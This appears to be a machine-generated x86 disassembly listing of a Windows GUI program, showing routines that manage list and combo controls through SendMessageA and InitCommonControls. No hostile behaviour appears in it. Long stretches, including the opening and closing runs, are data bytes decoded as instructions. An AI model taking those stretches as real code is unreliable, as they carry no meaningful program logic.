adc dl [ ebx + 0x65 ]
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
arpl [ ebp ] ax
sbb al 0x0
and al 0x0
add [ eax ] ch
add [ eax ] al
inc eax
add [ edx + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x43a2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x43 ] dh
insd
popad
dec ecx
outsb
js r-xdata
dec ecx
insb
jae r-xdata
rol [ ebx ] 0x84
movsd [ edi ] [ esi ]
inc ecx
add [ esi ] cl
inc ecx
add ah bh
rol [ ebx ] 0x54
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x42 ] bl
inc ebx
add [ esi + edi * 4 + 0x43 ] bh
add [ eax - 0x67 ] al
inc ecx
add [ esi + edi * 4 - 0x405fffbd ] ch
inc ebx
add [ edi + edi * 4 - 0x6193ffbd ] ch
inc ecx
add [ ecx + eax * 8 + 0x43 ] cl
add [ eax - 0x2bffbc3f ] bl
mov eax [ 0xffffffffc1a00041 ]
inc ebx
add [ eax ] cl
mov [ 0xffffffffa2380041 ] al
inc ecx
add [ edx - 0x3e4bffbf ] cl
inc ebx
add al dl
movsb [ edi ] [ esi ]
inc ecx
add [ eax ] ch
movsd [ edi ] [ esi ]
inc ecx
add [ ebp - 0x3dc3ffbf ] bh
inc ebx
add [ edx + eax * 8 + 0x43 ] al
add [ edx ] dl
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x41 ] dh
inc ebx
add al bh
lea eax [ ecx ]
add [ ebx - 0x6607ffbf ] bl
xor eax [ eax ]
js r-xdata
insd
jae r-xdata
inc eax
add [ eax + eax ] ah
add bh bh
add [ eax + edx ] bh
and [ ebp - 0x5a8bffbd ] ah
inc ebx
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
ror [ eax + 0x70043a2 ] 0xd
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
inc eax
add [ eax + 0x33 ] bh
je r-xdata
inc ebx
add [ eax + 0x2 ] ah
xor ah [ ebp - 0x5aa1ffbd ]
je r-xdata
jl r-xdata
je r-xdata
add [ eax + 0x7f ] dl
inc esp
add [ edx + ebx * 2 ] cl
inc ebp
add [ eax ] dl
pop edx
inc ebp
add [ edi + edi * 2 + 0x44 ] dh
add ah ah
jl r-xdata
add [ ecx + ebx * 2 ] dh
test [ ebx ] dh
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah al
mov ah 0x43
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 + 0x1a440041 ] dl
inc esp
rol [ eax + eax - 0x40 ] cl
imul ebp [ esi + 0x67 ] 0xa3989073
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x6f ]
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
rol [ ebx ] 0xc0
sahf
inc ecx
add ah dl
rol [ ebx ] 0xe8
add [ eax - 0x7bffbfcd ] al
inc eax
inc ecx
add al bh
rol [ ebx ] 0x1c
rol [ ebx ] 0x28
rol [ ebx ] 0x34
inc ecx
add [ eax ] al
fwait
inc ecx
add al bh
cdq
insd
jae r-xdata
inc [ ebx ]
add [ eax ] al
add [ eax + edi * 2 + 0x74 ] dh
add [ ebx - 0x7d ] dl
add [ ebp + ebx * 4 + 0x43 ] dl
add al bl
popfd
inc ebx
add [ eax - 0x63 ] ch
inc ebx
add [ esi + ebx * 4 + 0x43 ] al
add ah cl
lahf
inc ebx
add [ edx + eax * 8 - 0x3db3ffbd ] bh
inc ebx
add [ esi + edi * 2 + 0x44 ] bh
add [ ecx + ebx * 2 + 0x59c00045 ] ch
inc ebp
add [ esi + edi * 2 + 0x59e80044 ] dh
inc ebp
add [ eax ] dl
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ esi + 0x280043 ] 0x0
js r-xdata
out 0x43 eax
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
add al [ eax ]
add [ eax ] al
js r-xdata
mov [ 0xffffffff865c0043 ] al
inc ebx
add [ ebx ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
call InitCommonControls
js r-xdata
add [ 0x6d6f4354 ] dl
add [ edx + eax * 8 + 0x43 ] cl
add al dh
pop ecx
inc ebp
add [ eax ] dh
jg r-xdata
inc ebp
add [ eax + 0x7e ] cl
inc esp
add [ ecx + ebx * 2 + 0x45 ] bl
add al ch
mov ah 0x44
add al al
jg r-xdata
pop ecx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x3bffbdeb ] ch
mov ah 0x44
add ah bl
adc eax 0x7ee80042
inc esp
adc eax 0xb4c40042
inc esp
movsd [ edi ] [ esi ]
inc ebx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
je r-xdata
inc ebx
add al ch
insb
jae r-xdata
jne r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xffffc08b
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
outsd
insd
add al bh
pop ecx
inc ebp
add al dh
mov ah 0x44
add [ eax + eax * 4 ] ah
inc esp
add [ eax + eax * 4 + 0x44 ] ah
add al ch
jle r-xdata
outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ edi + esi * 4 ] cl
inc ebx
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
inc ecx
add [ edx + ebx + 0x44 ] al
imul ebp [ esi + 0x67 ] 0x43a2f873
add ah cl
out 0x43 al
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add al ch
in eax 0x43
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add al bh
mov [ 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
mov [ 0x43 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx + 0x180043 ] 0x0
mov eax ebx
pop ecx
pop edx
pop ebx
retn
add [ ebp + ebx * 4 + 0x7f940043 ] dl
inc esp
add [ eax + 0x15 ] ah
inc edx
add ah dh
adc eax 0x16480042
inc edx
add ah dl
jge r-xdata
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
js r-xdata
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ ebx + esi * 4 - 0x1fbffbd ] bl
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah al
mov dh 0x43
add [ eax ] ah
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add [ ebp + esi * 4 - 0x369fffbd ] cl
inc esp
add [ eax + edi * 4 + 0x43 ] bl
add [ eax ] dl
int 0x44
add [ ecx * 8 + 0x11d00044 ] dl
inc esp
add [ eax - 0x13ffbc44 ] dh
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x38 ] 0x8000441c
adc al [ eax + eax - 0x54 ]
adc al [ eax + eax - 0x24 ]
sbb al 0x44
add [ ecx + edx + 0x1c040044 ] ah
inc esp
add [ eax ] dl
sbb al 0x44
add [ esp + ebx + 0x47ac0044 ] bl
inc ebp
add ah dh
adc [ eax + eax + 0x24 ] eax
sbb eax [ eax + eax - 0x58 ]
adc al 0x44
add [ eax - 0x57ffbc45 ] bl
mov esp 0x12e80043
inc esp
add [ ebx + edi * 4 - 0x4393ffbd ] cl
inc ebx
add al ah
sbb eax [ eax + eax + 0xe ]
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0xc ] ch
inc edx
add [ eax + 0x2 ] ch
add [ eax ] al
pop es
add bh ch
dec [ 0x4eb009b0 ]
mov esp 0x201ffd9
mov ch 0xff
or [ ebx + eax * 2 + 0x43b76400 ] bh
add [ edi + esi * 4 ] bh
inc ebx
add [ esi * 4 - 0x445fffbd ] bh
inc ebx
add ah al
mov bh 0x43
add [ eax ] al
mov ebp 0x54110043
inc ebx
jne r-xdata
insb
jae r-xdata
insb
jae r-xdata
movsb [ edi ] [ esi ]
inc ebx
add [ eax + ebp * 8 + 0xb0043 ] bh
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
movsd [ edi ] [ esi ]
inc ebx
add [ esi - 0x5b ] bl
add [ ebp - 0x5befffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ebx
add [ ebp + 0x43 ] dh
add [ eax ] bl
nop
inc ebx
add [ eax + 0x33 ] dh
inc eax
add al ch
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x280043a6 ] al
add [ eax ] al
inc esp
sub_43a6b0
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_42bdd0
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_43a6dc
push ebx
mov ebx eax
mov eax ebx
call sub_43a6b0
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
sub_43a7b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_4042c4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x24 ]
mov edx esi
call sub_403f0c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov eax ebx
call sub_43a778
call sub_43abec
test al al
je r-xdata
push 0xffffffff
mov eax ebx
call sub_43a9d4
push eax
mov eax ebx
call sub_43a7a4
xor ecx ecx
pop edx
call sub_42bfc4
mov eax ebx
call sub_43a778
mov al [ eax + 0x229 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov eax ebx
call sub_43a778
mov eax [ eax + 0x23c ]
call sub_419538
test eax eax
jle r-xdata
mov eax ebx
call sub_43a778
call sub_43ad78
mov eax ebx
call sub_43a778
xor edx edx
call sub_43ada8
cmp [ eax + 0x24 ] 0xffffffff
jg r-xdata
mov eax ebx
call sub_43a778
call sub_43adb4
sub_43a868
push ebx
mov ebx eax
cmp edx [ ebx + 0xc ]
je r-xdata
pop ebx
retn
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_43a778
mov al [ eax + 0x229 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_43a778
call sub_43ad78
sub al 0x2
jne r-xdata
sub_43a898
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi eax
xor ebx ebx
sub edx 0x1
jb r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ esi + 0x10 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x1c ]
je r-xdata
dec edx
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax esi
call sub_43a9d4
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_43a7a4
mov edx esp
call sub_42bef8
jmp r-xdata
mov bl 0x1
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x20 ]
je r-xdata
jmp r-xdata
mov eax esi
call sub_43a9d4
push eax
mov eax esi
call sub_43a9d4
push eax
mov eax esi
call sub_43a778
pop edx
pop ecx
call sub_43abcc
push 0xf00
mov eax [ esi + 0x1c ]
inc eax
call sub_42be48
push eax
mov eax esi
call sub_43a9d4
push eax
mov eax esi
call sub_43a7a4
pop edx
pop ecx
call sub_42bf94
jmp r-xdata
mov bl 0x1
mov [ esi + 0x20 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
push 0xf000
lea eax [ edi + 0x1 ]
call sub_42bedc
push eax
mov eax esi
call sub_43a9d4
push eax
mov eax esi
call sub_43a7a4
pop edx
pop ecx
call sub_42bf94
xor edi edi
sub_43a9fc
push ebx
push esi
push edi
add esp 0xffffffd8
mov esi ecx
mov ebx eax
test edx edx
jne r-xdata
mov edi edx
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0xf8 ]
mov edi eax
jmp r-xdata
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ab3c
push esp
mov eax ebx
call sub_43aa70
pop edx
call sub_42bf10
mov eax edi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43aa4c
mov esi eax
test esi esi
jge r-xdata
sub_43aa4c
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_44fadc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_43aa70
call sub_42becc
pop ebx
retn
sub_43aa7c
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_44fadc
test al al
je r-xdata
mov eax esi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov [ esp ] 0x4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_43aa70
mov edx esp
call sub_42bee0
test eax eax
je r-xdata
mov eax esp
xor ecx ecx
mov edx 0x28
call sub_402b34
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov edx esp
mov eax [ ebx + 0x4 ]
call sub_43ac44
mov esi eax
jmp r-xdata
mov esi [ esp + 0x20 ]
sub_43aafc
push ebx
add esp 0xffffffe8
mov ebx eax
mov [ esp ] 0x1
mov [ esp + 0x8 ] edx
mov eax ebx
call sub_43aa70
mov ecx esp
or edx 0xffffffff
call sub_42bf28
add esp 0x18
pop ebx
retn
sub_43ab60
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_43a778
cmp [ eax + 0x2ea ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
call sub_404378
push eax
mov eax [ ebx + 0x24 ]
call sub_404378
push eax
call lstrcmpA
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_43a778
mov esi eax
mov eax ebx
call sub_43a778
mov edx eax
mov ecx ebx
mov eax [ esi + 0x2ec ]
call [ esi + 0x2e8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_43abcc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f7d8
mov ecx edi
mov edx esi
call sub_42bf38
pop edi
pop esi
pop ebx
retn
sub_43abf8
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x1
je r-xdata
test esi 0x2
je r-xdata
or bl 0x1
test esi 0x4
je r-xdata
or bl 0x2
test esi 0x8
je r-xdata
or bl 0x4
test esi 0x10
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_43ac44
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
lea edi [ ebp - 0x2d ]
mov ecx 0xa
[ edi ] [ esi ]
mov esi eax
xor eax eax
push ebp
push sub_43ad65
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x2d ]
test bl 0x4
je r-xdata
cmp [ esi + 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0xd ]
jmp r-xdata
mov edx [ ebp - 0x29 ]
mov eax [ esi + 0x22c ]
call sub_43aa7c
mov ebx eax
cmp [ ebp - 0x29 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ad6c
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax ebx
call sub_43abf8
mov [ ebp - 0x5 ] al
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x29 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0xd ]
mov [ eax + 0xc ] edx
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test [ ebp - 0x5 ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_403eb8
cmp [ ebp - 0x19 ] 0x0
je r-xdata
test [ ebp - 0x5 ] 0x10
je r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x11 ]
mov [ eax + 0x10 ] edx
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x19 ]
call sub_408a58
jmp r-xdata
mov cl [ ebp - 0x5 ]
mov edx [ esi + 0x28c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x9 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x28c ]
add eax 0x24
mov edx [ ebp - 0x4 ]
call sub_403f0c
test [ ebp - 0x5 ] 0x2
je r-xdata
sub_43ad78
push ebx
mov ebx eax
mov eax ebx
call sub_44fadc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44f7d8
mov edx sub_43ab60
xor ecx ecx
call sub_42bff4
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_43adb4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44fadc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x295 ] 0x0
jne r-xdata
mov eax [ ebx + 0x23c ]
call sub_419538
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43adf4
inc edi
dec esi
jne r-xdata
sub_43adf4
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp edx
mov ebx eax
mov eax ebx
call sub_44fadc
test al al
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_43a764
mov edi eax
mov [ esp + 0x1 ] 0x15
mov eax [ edi + 0x1c ]
mov [ esp + 0x19 ] eax
mov eax [ edi + 0x10 ]
call sub_404378
mov [ esp + 0xd ] eax
mov al [ edi + 0xc ]
mov [ esp ] al
mov eax edi
call sub_4191a8
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x5 ] eax
mov eax ebx
mov si 0xffc8
call sub_403324
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ esp ]
mov eax [ eax + edx * 4 ]
mov [ esp + 0x5 ] eax
jmp r-xdata
and [ esp + 0x1 ] 0xffffffef
mov eax [ esp + 0x5 ]
or eax 0x800
or eax 0x8000
mov [ esp + 0x5 ] eax
jmp r-xdata
cmp [ edi + 0x1c ] 0xffffffff
je r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_43a764
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_44f7d8
lea ecx [ esp + 0x5 ]
pop edx
call sub_42bf54
cmp [ ebx + 0x215 ] 0x2
jne r-xdata
or [ esp + 0x1 ] 0x2
mov [ esp + 0x9 ] eax
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_43a764
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_44f7d8
lea ecx [ esp + 0x5 ]
pop edx
call sub_42bf54
jmp r-xdata
mov eax [ edi + 0x24 ]
cmp eax 0xffffffff
jle r-xdata
cmp [ ebx + 0x215 ] 0x3
jne r-xdata
mov eax ebx
call sub_44f7d8
mov ecx [ edi + 0x24 ]
or edx 0xffffffff
call sub_42bf70
jmp r-xdata
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_43a764
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_44f7d8
mov ecx [ edi + 0x24 ]
pop edx
call sub_42bf70
sub_43af44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43910c
mov edi esi
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
lea eax [ ebx + 0x10 ]
mov edx [ edi + 0x10 ]
call sub_403f0c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43af90
push ebx
mov ebx eax
mov eax ebx
call sub_43920c
mov eax ebx
call sub_4191a8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x2
je r-xdata
mov eax edx
call sub_439404
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_43afc4
push ebx
mov ebx eax
mov eax ebx
call sub_439228
mov eax ebx
call sub_4191a8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x1
je r-xdata
mov eax edx
call sub_439404
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_43b018
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov [ ebx + 0x1c ] edx
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax ebx
call sub_439234
mov eax ebx
call sub_4191a8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43b048
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4192d0
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop esi
pop ebx
retn
sub_43b0a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax esi
call sub_43b09c
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_4191a8
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43b124
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_419738
mov ebp eax
mov esi ebx
mov eax edi
call sub_419538
mov ebx eax
dec ebx
sub ebx esi
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
sub_43b15c
push ebx
push esi
mov ebx edx
mov esi eax
sub cl 0x1
jb r-xdata
mov esi ebx
mov [ esi + 0x18 ] 0xffffffff
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x24 ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x10 ]
call sub_403eb8
pop esi
pop ebx
retn
sub cl 0x2
jb r-xdata
mov eax esi
call sub_419848
test [ eax + 0x1c ] 0x8
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
call sub_4191a8
push eax
push 0x144
mov eax esi
call sub_419848
call sub_44f7d8
push eax
call SendMessageA
sub_43b1d0
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402b34
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0xc ] eax
mov eax esp
push eax
push 0x0
push 0x404
mov eax esi
call sub_419848
call sub_44f7d8
push eax
call SendMessageA
test eax eax
sete al
neg al
sbb ebp ebp
mov edx edi
mov eax esi
call sub_43b110
mov ebx eax
mov [ esp ] 0x37
mov eax [ ebx + 0x10 ]
call sub_404378
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4191a8
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_404178
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x20 ] eax
test ebp ebp
je r-xdata
mov eax esp
push eax
push edi
push 0x405
mov eax esi
call sub_419848
call sub_44f7d8
push eax
call SendMessageA
mov eax esp
push eax
push edi
push 0x401
mov eax esi
call sub_419848
call sub_44f7d8
push eax
call SendMessageA
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43b33c
sbb [ ebx + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx + 0x180043 ] dh
jb r-xdata
inc eax
add [ eax + ebx * 2 ] dh
inc eax
add [ eax + 0x58 ] al
inc eax
add [ ebx + esi + 0x33780040 ] al
inc eax
add [ eax + 0x58 ] dl
inc eax
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ 0x6d6f4354 ] dl
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ esi - 0x4 ] al
mov dl 0x43
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx - 0x4ce7ffbd ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 4 + 0x180043 ] al
rcl [ ebp - 0x75 ] 0xec
push ecx
push ebx
push esi
test dl dl
je r-xdata
add [ ecx + 0x27883 ] cl
js r-xdata
mov eax [ ebx + 0x23c ]
mov [ eax + 0x10 ] ebx
mov eax [ eax + 0x14 ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_43a6dc
mov ecx esi
